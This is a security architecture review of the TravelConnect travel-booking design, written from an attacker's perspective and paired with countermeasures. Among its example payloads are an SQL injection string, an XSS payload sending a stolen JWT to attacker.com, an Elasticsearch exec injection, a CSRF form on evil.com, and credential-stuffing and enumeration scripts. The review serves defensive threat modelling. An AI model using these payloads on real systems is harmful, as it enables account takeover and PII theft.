# Security Review: TravelConnect System Design
## Adversarial Perspective Analysis

**Review Date**: 2026-02-10
**Reviewer**: Security Architect (Adversarial Analysis)
**Document**: TravelConnect System Design Document

---

## Executive Summary

From an attacker's perspective, TravelConnect presents multiple high-value exploitation opportunities. The system handles sensitive PII (passport numbers), financial data (payment processing), and user credentials across a distributed microservices architecture. Critical attack vectors include JWT storage vulnerabilities, missing input validation specifications, inadequate authentication controls, and infrastructure security gaps.

**Primary Attack Goals**:
1. Financial fraud via payment manipulation
2. PII exfiltration (passport numbers, personal data)
3. Account takeover for booking fraud
4. Lateral movement across microservices

**Easiest Attack Paths**: JWT theft via XSS → account takeover → unauthorized bookings → PII exfiltration

---

## 1. Critical Attack Vectors (Score 1-2)

### 1.1 JWT Storage Vulnerability - XSS-Based Account Takeover
**Score**: 1 (Critical Exposure)

**Attack Scenario**:
The design document specifies JWT tokens for authentication but does not specify secure storage mechanism (Section 5, Authentication). If tokens are stored in localStorage (common React pattern):
1. Attacker injects XSS payload via unvalidated booking data (passenger names, provider responses)
2. Malicious script reads JWT from localStorage: `localStorage.getItem('jwt')`
3. Attacker exfiltrates token to attacker-controlled server
4. Attacker uses stolen token to access victim's bookings, payment methods, and PII
5. Token valid for 24 hours (Section 5, line 165) = extended exploitation window

**Required Attacker Skill**: Script kiddie (automated XSS scanners + simple JavaScript)

**Expected Impact**:
- Full account compromise
- Access to payment methods and booking history
- PII exfiltration (passport numbers stored in bookings)
- Ability to create fraudulent bookings charged to victim

**Attack Chain Enhancement**:
Missing input validation (Section 6, no validation policy) + JWT in localStorage + 24-hour token lifetime = trivial full account compromise

**Countermeasures**:
- **IMMEDIATE**: Store JWT in httpOnly secure cookies (not accessible via JavaScript)
- Implement strict Content Security Policy (CSP) to block inline scripts
- Specify input validation policy with output encoding for all user-controlled data
- Reduce token lifetime to 1-2 hours, implement refresh token rotation
- Add token binding to user agent/IP address

**Document References**: Section 5 (Authentication), Section 2 (Frontend tech stack)

---

### 1.2 Missing Input Validation Policy - Injection Attack Surface
**Score**: 1 (Critical Exposure)

**Attack Scenario**:
No input validation policy specified across the design document. Exploitable injection points:

**SQL Injection via Search Parameters**:
```
GET /api/v1/search/flights?departure=LAX' OR '1'='1
```
If Search Service constructs dynamic SQL queries against PostgreSQL, attacker can:
1. Extract entire users table including password hashes
2. Modify booking records to change prices or destinations
3. Execute administrative stored procedures

**XSS via Booking Data**:
Passenger names and provider responses stored in JSONB fields (Section 4, line 106) likely rendered in UI:
```json
POST /api/v1/bookings
{
  "passengers": [
    {"name": "<script>fetch('https://attacker.com?jwt='+localStorage.getItem('jwt'))</script>"}
  ]
}
```

**NoSQL Injection via Elasticsearch**:
Search Service queries Elasticsearch (Section 3, line 63) without specified input sanitization:
```
GET /api/v1/search/hotels?query={"script":{"source":"java.lang.Runtime.getRuntime().exec('calc')"}}
```

**Required Attacker Skill**: Moderate (SQL injection tools like sqlmap, basic web security knowledge)

**Expected Impact**:
- Full database compromise (all user data, payment records, bookings)
- Persistent XSS enabling mass account takeover
- Remote code execution via Elasticsearch script injection
- Data exfiltration of PII and financial data

**Countermeasures**:
- **IMMEDIATE**: Specify comprehensive input validation policy using Joi schemas
- Parameterized queries for all database interactions (no string concatenation)
- Output encoding for all user-controlled data rendered in UI
- Elasticsearch query builder library (avoid raw query construction)
- File upload restrictions: whitelist allowed MIME types, size limits, malware scanning
- Schema validation at API Gateway layer before forwarding to services

**Document References**: Section 5 (API Design), Section 4 (Data Model), Section 3 (Search Service)

---

### 1.3 Missing Authorization Checks - Insecure Direct Object References (IDOR)
**Score**: 2 (High-Value Target)

**Attack Scenario**:
Design states "Users can only access their own bookings" (Section 5, line 169) but does not specify authorization enforcement mechanism:

1. Attacker creates account, makes one booking (receives booking ID: `123e4567-e89b-12d3-a456-426614174000`)
2. Enumerates other users' booking IDs by iterating UUIDs or observing booking references
3. Attempts to access other users' bookings:
   ```
   GET /api/v1/bookings/223e4567-e89b-12d3-a456-426614174001
   Authorization: Bearer {attacker_jwt}
   ```
4. If authorization check missing or improperly implemented, attacker retrieves victim's booking data including:
   - Passport numbers (Section 5, line 159)
   - Payment method details
   - Travel itinerary and personal information

**Privilege Escalation Variant**:
- Corporate accounts have expense tracking (Section 1, line 21)
- Travel agents manage multiple clients (Section 1, line 19)
- If role-based checks missing, regular user can access `GET /api/v1/admin/bookings` or modify role field in user profile

**Required Attacker Skill**: Script kiddie (simple HTTP request manipulation, UUID enumeration scripts)

**Expected Impact**:
- Mass PII exfiltration (all users' passport numbers, travel plans)
- Privacy breach and regulatory violations (GDPR, CCPA)
- Competitor intelligence (corporate travel patterns)
- Identity theft enablement

**Countermeasures**:
- **IMMEDIATE**: Specify authorization middleware that validates `booking.user_id === jwt.user_id` before returning data
- Implement attribute-based access control (ABAC) for corporate/agent roles
- Resource-level authorization checks in Booking Service, not just API Gateway
- Audit logging for all booking access attempts (detect enumeration)
- Rate limiting on booking detail endpoint (prevent mass enumeration)
- Use non-sequential identifiers with sufficient entropy

**Document References**: Section 5 (Booking Endpoints, Authentication), Section 1 (Target Users)

---

### 1.4 Missing Rate Limiting on Critical Endpoints - Credential Stuffing & Enumeration
**Score**: 2 (High-Value Target)

**Attack Scenario**:
Rate limiting only specified for search APIs (Section 7, line 209). Missing on authentication and booking endpoints enables:

**Credential Stuffing Attack**:
1. Attacker obtains leaked credentials from other breaches (100M+ credential pairs available)
2. Automates login attempts against `/api/v1/auth/login`:
   ```python
   for email, password in leaked_credentials:
       response = requests.post('/api/v1/auth/login', json={'email': email, 'password': password})
       if response.status_code == 200:
           save_valid_account(email, password, response.json()['token'])
   ```
3. No rate limiting = 1000+ attempts per second
4. Compromises valid accounts for booking fraud

**User Enumeration via Password Reset**:
```python
for email in potential_customers:
    response = requests.post('/api/v1/auth/reset-password', json={'email': email})
    if 'reset link sent' in response.text:
        confirmed_users.append(email)  # User exists
```

**Payment Endpoint Abuse**:
- No rate limiting on booking creation = automated booking fraud
- Test stolen credit cards via rapid booking attempts
- First successful charge confirms valid card, cancel booking, use card elsewhere

**Required Attacker Skill**: Script kiddie (credential stuffing tools, automated scripts)

**Expected Impact**:
- Mass account compromise (thousands of accounts)
- Payment fraud and chargebacks
- User enumeration for targeted phishing
- Service degradation from high-volume automated requests

**Countermeasures**:
- **IMMEDIATE**: Implement rate limiting on ALL authentication endpoints (5 login attempts per 15 minutes per IP)
- Rate limiting on booking creation (10 bookings per hour per user)
- CAPTCHA after 3 failed login attempts
- Account lockout after 10 failed attempts (with unlock via email)
- Monitor for distributed credential stuffing (rate limit by account, not just IP)
- IP reputation checking and blocking known bot networks

**Document References**: Section 7 (Security Requirements), Section 5 (Authentication Endpoints)

---

## 2. High-Probability Exploits

### 2.1 CSRF on Booking Modification/Cancellation
**Score**: 2 (High-Value Target)

**Attack Scenario**:
JWT in Authorization header provides CSRF protection for token-based auth, BUT if JWT stored in cookies (recommended fix for 1.1), CSRF becomes exploitable:

1. Victim logs into TravelConnect (JWT stored in httpOnly cookie)
2. Attacker sends phishing email with link: `https://evil.com/csrf-attack.html`
3. Page contains hidden form:
   ```html
   <form action="https://travelconnect.com/api/v1/bookings/victim-booking-id" method="DELETE">
   </form>
   <script>document.forms[0].submit()</script>
   ```
4. Browser automatically includes JWT cookie in cross-site request
5. Booking cancelled without user consent
6. If cancellation triggers refund to different payment method = fund theft

**Required Attacker Skill**: Moderate (basic HTML/JavaScript knowledge)

**Expected Impact**:
- Unauthorized booking cancellations
- Potential financial fraud via refund redirection
- User frustration and service reputation damage

**Countermeasures**:
- Implement CSRF tokens (double-submit cookie pattern or synchronizer token)
- SameSite cookie attribute: `SameSite=Strict` or `Lax`
- Require re-authentication for sensitive operations (booking cancellation, payment method changes)
- CORS policy: whitelist only TravelConnect domains

**Document References**: Section 5 (Booking Endpoints, Authentication)

---

### 2.2 Session Fixation via Missing Session Regeneration
**Score**: 3 (Moderate Vulnerability)

**Attack Scenario**:
Design specifies "Session timeout: 30 minutes of inactivity" (Section 7, line 210) but doesn't specify session regeneration on authentication:

1. Attacker creates session on TravelConnect, obtains session ID
2. Tricks victim into using attacker's session (via link: `https://travelconnect.com?session=attacker-session-id`)
3. Victim logs in using attacker's session
4. If session ID not regenerated, attacker's session now authenticated as victim
5. Attacker accesses victim's account without credentials

**Modern Variant with JWT**:
If JWT generation doesn't include unique session binding:
1. Attacker obtains valid JWT structure
2. If JWT signature key is weak or guessable, attacker forges tokens
3. Token doesn't bind to specific session/device = usable from anywhere

**Required Attacker Skill**: Moderate (understanding of session management)

**Expected Impact**:
- Account takeover
- Access to bookings and payment methods

**Countermeasures**:
- Regenerate session ID/JWT upon authentication
- Bind tokens to user agent and IP address
- Implement device fingerprinting
- Logout invalidates tokens server-side (requires token blacklist/revocation mechanism)

**Document References**: Section 7 (Security Requirements), Section 5 (Authentication)

---

### 2.3 Password Reset Token Prediction
**Score**: 3 (Moderate Vulnerability)

**Attack Scenario**:
Password reset flow specified with 2-hour valid token (Section 5, line 128) but no token generation mechanism:

1. Attacker triggers password reset for target victim: `POST /api/v1/auth/reset-password {"email": "victim@example.com"}`
2. If token is predictable (e.g., sequential, timestamp-based, weak random):
   - Attacker generates potential tokens and attempts reset: `POST /api/v1/auth/confirm-reset {"token": "predicted_token", "new_password": "attacker_password"}`
3. 2-hour validity window provides extended brute-force opportunity
4. No rate limiting on reset confirmation = automated token guessing

**Required Attacker Skill**: Moderate (crypto knowledge, scripting)

**Expected Impact**:
- Account takeover without email access
- Mass account compromise if pattern identified

**Countermeasures**:
- Cryptographically secure random token generation (128+ bits entropy)
- One-time use tokens (invalidate after single use attempt)
- Rate limiting on password reset confirmation (3 attempts per token)
- Short token lifetime (30 minutes, not 2 hours)
- Email verification before allowing reset

**Document References**: Section 5 (Authentication Endpoints)

---

### 2.4 Repudiation Risk - Insufficient Audit Logging
**Score**: 3 (Moderate Vulnerability)

**Attack Scenario**:
Logging specified for "Request/response logging for all API calls" (Section 6, line 183) but no mention of:
- Security event logging (failed login attempts, authorization failures)
- Privileged action logging (booking modifications, refunds)
- Log integrity protection (tampering detection)

**Exploitation**:
1. Attacker compromises account via credential stuffing
2. Creates fraudulent bookings or accesses competitor PII
3. Deletes or modifies logs to cover tracks
4. No audit trail = undetectable breach, no attribution

**Post-Breach Scenario**:
- Incident response team cannot determine breach scope
- Cannot identify compromised accounts or data exfiltration extent
- Regulatory compliance failures (PCI DSS requires audit logs)

**Required Attacker Skill**: Moderate (log tampering knowledge)

**Expected Impact**:
- Undetected breaches and data theft
- Inability to prosecute attackers
- Regulatory fines for insufficient audit controls

**Countermeasures**:
- Comprehensive security event logging (authentication events, authorization failures, admin actions)
- Immutable log storage (write-once, append-only)
- Log forwarding to SIEM (Security Information and Event Management)
- Real-time alerting on suspicious patterns (mass login failures, rapid booking creation)
- Log retention: minimum 90 days, preferably 1 year

**Document References**: Section 6 (Logging)

---

## 3. Attack Chains - Combined Exploitation

### Chain 1: XSS → JWT Theft → IDOR → Mass PII Exfiltration
**Combined Score**: 1 (Critical)

**Attack Path**:
1. Inject XSS via booking passenger name (no input validation)
2. Steal JWT from localStorage (insecure storage)
3. Use stolen token to enumerate bookings via IDOR (missing authorization)
4. Exfiltrate all accessible passport numbers and travel data
5. Operate undetected (insufficient audit logging)

**Automated Attack**: Single script automates entire chain, targeting thousands of users

**Countermeasures**: Address vulnerabilities 1.1, 1.2, 1.3, 2.4

---

### Chain 2: Credential Stuffing → Account Takeover → Booking Fraud → Refund Theft
**Combined Score**: 2 (High-Value)

**Attack Path**:
1. Credential stuffing attack on login endpoint (no rate limiting)
2. Compromise valid accounts with stored payment methods
3. Create fraudulent bookings charged to victim's card
4. Immediately cancel bookings
5. If refund workflow allows modification of refund destination = financial theft
6. Payment failures trigger refund (Section 6, line 177) but no fraud detection

**Countermeasures**: Address vulnerabilities 1.4, 2.1, add payment fraud detection

---

### Chain 3: Infrastructure Compromise → Lateral Movement → Database Access
**Combined Score**: 2 (High-Value)

**Attack Path**:
1. Exploit vulnerable dependency (no vulnerability scanning specified)
2. Gain access to API Gateway container
3. Enumerate internal network (missing network segmentation specification)
4. Access PostgreSQL database directly (no IP whitelisting specified)
5. Exfiltrate entire database including password hashes
6. If database encryption at rest missing = plaintext PII exposure

**Countermeasures**: See Section 4 (Infrastructure Targets)

---

## 4. Infrastructure Attack Targets

| Component | Attack Vector | Missing Protection | Exploitability | Impact | Priority |
|-----------|---------------|-------------------|----------------|--------|----------|
| **PostgreSQL Database** | Direct network access, SQL injection | Network segmentation, connection IP whitelisting, encryption at rest | **Easy** | **Critical** (all user data, payment records) | **1** |
| **Elasticsearch** | Unauthenticated access, script injection | Authentication, query sanitization, network isolation | **Easy** | **High** (search data, potential RCE) | **2** |
| **Redis Cache** | Unauthenticated access, key enumeration | Authentication (requirepass), TLS, network isolation | **Trivial** | **High** (session hijacking, cached PII) | **1** |
| **RabbitMQ** | Default credentials, management console exposure | Credential rotation, network isolation, disable management interface | **Easy** | **Medium** (message interception, DoS) | **3** |
| **AWS ECS Containers** | Exposed secrets, vulnerable base images | Secrets management (AWS Secrets Manager), image scanning | **Moderate** | **Critical** (lateral movement, cloud resource access) | **2** |
| **Stripe SDK** | Outdated version 12.8.0 (check for CVEs), API key exposure | Dependency vulnerability scanning, key rotation | **Moderate** | **Critical** (payment fraud, PCI compliance) | **2** |
| **CloudFront CDN** | Misconfigured origin access, cache poisoning | Origin Access Identity, signed URLs for sensitive content | **Moderate** | **Medium** (content manipulation, info disclosure) | **3** |

---

### 4.1 Critical: Redis Cache - Unauthenticated Access
**Attack Scenario**:
Redis specified for "session management and rate limiting" (Section 2, line 32) but no authentication mechanism mentioned:

1. Attacker scans AWS security group, finds Redis port 6379 exposed to internal network
2. If API Gateway container compromised, attacker accesses Redis without password
3. Enumerates all session keys: `KEYS session:*`
4. Reads session data containing user IDs, roles, cart contents
5. Hijacks active sessions by injecting attacker-controlled session data
6. If rate limiting counters stored in Redis, attacker resets counters to bypass limits

**Exploitability**: Trivial (Redis default: no authentication)

**Countermeasures**:
- Enable Redis authentication: `requirepass` directive
- Enable TLS for Redis connections
- Network segmentation: Redis accessible only from application services, not public internet
- Session encryption before storage in Redis
- Monitor Redis command execution for suspicious patterns

---

### 4.2 Critical: PostgreSQL - Missing Encryption at Rest
**Attack Scenario**:
Design specifies "Database connections encrypted with TLS" (Section 7, line 207) but doesn't mention encryption at rest:

1. Attacker gains access to AWS account (phishing, credential leak)
2. Creates EBS snapshot of PostgreSQL database volume
3. Mounts snapshot in attacker-controlled EC2 instance
4. Directly reads database files containing:
   - Password hashes (bcrypt, but still offline cracking risk)
   - Plaintext passport numbers (Section 5, line 159)
   - Payment metadata (amounts, methods, Stripe IDs)

**Exploitability**: Easy (AWS snapshot feature is legitimate functionality)

**Impact**: Critical (full database compromise, regulatory violations)

**Countermeasures**:
- Enable encryption at rest (AWS RDS encryption or PostgreSQL pgcrypto)
- Encrypt sensitive columns (passport numbers, PII)
- Rotate encryption keys regularly
- Restrict snapshot permissions via IAM policies
- Enable database activity monitoring (AWS CloudWatch)

---

### 4.3 High: Secrets Management - Environment Variable Exposure
**Attack Scenario**:
Design specifies "Environment-specific configuration via environment variables" (Section 6, line 195):

1. Attacker gains read access to ECS task definition (leaked AWS credentials, insider threat)
2. Extracts environment variables containing:
   - Database credentials
   - Stripe API secret keys
   - JWT signing key
   - Third-party provider API keys
3. Uses credentials for lateral movement across all services

**Exploitability**: Easy (environment variables visible in container metadata, logs, crash dumps)

**Countermeasures**:
- Use AWS Secrets Manager or Parameter Store for sensitive configuration
- Rotate secrets automatically (90-day maximum)
- Never log environment variables
- Implement least-privilege IAM roles for secret access
- Audit secret access via CloudTrail

---

### 4.4 High: Dependency Vulnerabilities - Known CVEs
**Attack Scenario**:
Specific library versions listed (Section 2) but no vulnerability scanning specified:

1. Attacker identifies outdated dependencies (e.g., Stripe SDK 12.8.0, Passport.js 0.6.0)
2. Searches CVE databases for known vulnerabilities
3. If found, exploits known attack vectors (RCE, authentication bypass, XSS)
4. Example: Older Express versions vulnerable to parameter pollution attacks

**Exploitability**: Moderate (requires vulnerability research, but exploits often public)

**Countermeasures**:
- Implement automated dependency vulnerability scanning (Snyk, npm audit, Dependabot)
- Regular dependency updates (monthly patching cycle)
- Software Bill of Materials (SBOM) generation
- Monitor security advisories for used libraries
- Pin dependency versions, test updates in staging before production

---

## 5. Defense Gaps - Missing Security Controls

### 5.1 No Multi-Factor Authentication (MFA)
**Impact**: Phishing attacks and credential stuffing bypass single-factor authentication

**Attacker Perspective**: Any stolen password = full account access

**Recommendation**: Implement TOTP-based MFA (Google Authenticator, Authy) for high-value actions (payment method changes, booking modifications)

---

### 5.2 No Idempotency Guarantees for Payment Processing
**Impact**: Duplicate payment processing via replay attacks or race conditions

**Attack Scenario**:
1. User submits booking payment: `POST /api/v1/bookings` with payment details
2. Network error occurs, user retries request
3. If no idempotency key, both requests process → double charge
4. Attacker exploits by rapidly submitting identical requests

**Recommendation**: Implement idempotency keys (Stripe provides this), request deduplication

---

### 5.3 Missing Content Security Policy (CSP)
**Impact**: XSS attacks not mitigated at browser level

**Recommendation**: Implement strict CSP headers:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';
```

---

### 5.4 No Database Query Monitoring
**Impact**: SQL injection attacks undetected until data exfiltration complete

**Recommendation**: Implement database query monitoring and anomaly detection (sudden large result sets, unusual query patterns)

---

### 5.5 Missing API Gateway Input Size Limits
**Impact**: DoS via large payload attacks, memory exhaustion

**Recommendation**: Specify maximum request body size (e.g., 1MB for booking requests)

---

## 6. Positive Security Controls

### 6.1 HTTPS/TLS 1.3 for External Communication
**Score**: 5 (Excellent)

Well-specified use of modern TLS (Section 7, line 206), provides strong encryption in transit.

---

### 6.2 Password Complexity Requirements
**Score**: 4 (Good, but could be stronger)

8-character minimum with complexity (Section 7, line 208) is baseline acceptable. Consider increasing to 12 characters and checking against common password lists.

---

### 6.3 Separation of Payment Processing via Stripe
**Score**: 4 (Good)

Using Stripe SDK (Section 2, line 43) offloads PCI compliance burden. Ensure no raw card data stored in TravelConnect database.

---

### 6.4 Log Redaction for Sensitive Data
**Score**: 4 (Good)

Explicit mention of redacting passwords, payment details, passport numbers (Section 6, line 182) demonstrates security awareness.

---

### 6.5 Role-Based Access Control (RBAC) Mentioned
**Score**: 3 (Moderate - needs detailed specification)

RBAC mentioned for admin endpoints (Section 5, line 168) but lacks implementation details. Expand with specific role definitions and permission matrices.

---

## 7. Recommended Security Enhancements (Priority Order)

### Immediate (Critical - Implement Before Launch)
1. **Specify JWT storage mechanism**: httpOnly secure cookies, NOT localStorage
2. **Comprehensive input validation policy**: Joi schemas for all endpoints, parameterized queries
3. **Authorization enforcement**: Resource-level checks in services, not just API Gateway
4. **Rate limiting**: All authentication and booking endpoints
5. **Redis authentication**: Enable `requirepass` and TLS
6. **Database encryption at rest**: Enable RDS encryption
7. **Secrets management**: Migrate to AWS Secrets Manager

### High Priority (First 30 Days Post-Launch)
8. **CSRF protection**: Implement if using cookie-based JWT storage
9. **Audit logging expansion**: Security events, privileged actions, log integrity
10. **Dependency vulnerability scanning**: Automated pipeline integration
11. **MFA implementation**: TOTP for sensitive operations
12. **Network segmentation**: Database/Redis accessible only from application tier
13. **Content Security Policy**: Strict CSP headers

### Medium Priority (First 90 Days)
14. **Idempotency guarantees**: Payment request deduplication
15. **Session regeneration**: On authentication and privilege elevation
16. **Password reset improvements**: Shorter token lifetime, one-time use
17. **Database query monitoring**: Anomaly detection and alerting
18. **Penetration testing**: External security audit before production

---

## Summary

**Overall Security Posture**: High Risk

**Most Critical Attack Path**: XSS via missing input validation → JWT theft from localStorage → IDOR exploitation → mass PII exfiltration

**Easiest Exploitation**: Credential stuffing (no rate limiting on login) or Redis unauthenticated access (if network accessible)

**Highest Impact**: Database compromise via infrastructure vulnerability (all user data exposed)

**Recommendation**: Address all "Immediate" priority items before production deployment. Current design has critical gaps that guarantee exploitation by motivated attackers. The combination of missing input validation, insecure token storage, and inadequate authorization creates a perfect storm for account takeover and data breach.

**Regulatory Risk**: GDPR/CCPA violations likely due to PII exposure risks. PCI DSS compliance questionable without specified audit controls and secrets management.

**Bottom Line from Attacker Perspective**: This system is a high-value target with multiple trivial exploitation paths. A moderately skilled attacker could achieve full database compromise within hours of launch.